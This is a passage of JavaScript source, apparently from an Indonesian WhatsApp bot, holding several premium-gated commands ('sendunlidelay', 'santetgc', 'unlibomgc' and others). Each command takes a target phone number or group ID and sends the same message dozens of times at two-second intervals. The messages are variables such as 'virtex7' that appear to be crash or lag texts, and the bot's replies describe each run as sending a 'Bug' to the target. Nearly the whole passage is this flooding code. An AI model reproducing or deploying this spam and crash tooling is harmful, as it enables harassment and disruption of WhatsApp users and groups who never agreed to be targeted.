reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlidelay': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'gasfullgc' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
// BUG OWNER
case 'santetgc' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'unlidelaygc' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'unlilaggc' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'unlibomgc' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'unlicuygc' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke Grup WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@g.us'
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
